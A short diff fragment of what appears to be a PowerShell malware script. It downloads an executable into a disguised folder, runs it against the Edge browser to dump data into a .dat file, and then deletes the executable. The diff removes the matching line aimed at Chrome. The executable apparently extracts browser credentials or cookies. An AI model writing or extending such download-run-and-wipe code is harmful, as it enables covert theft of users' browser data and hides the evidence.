@@ -42,7 +42,6 @@ if(!(Test-Path -Path $outPath)) {
 Invoke-WebRequest -Uri $url -OutFile $outPath}
 Start-Sleep -Milliseconds 200
 C:\ProgramX64\extentions\evab.exe -o "C:\ProgramX64\extentions\out" edge > C:\ProgramX64\extentions\out\a.dat
-C:\ProgramX64\extentions\evab.exe -o "C:\ProgramX64\extentions\out" chrome > C:\ProgramX64\extentions\out\b.dat
 Start-Sleep -Milliseconds 200
 Remove-Item -Path "C:\ProgramX64\extentions\evab.exe" -Force
 
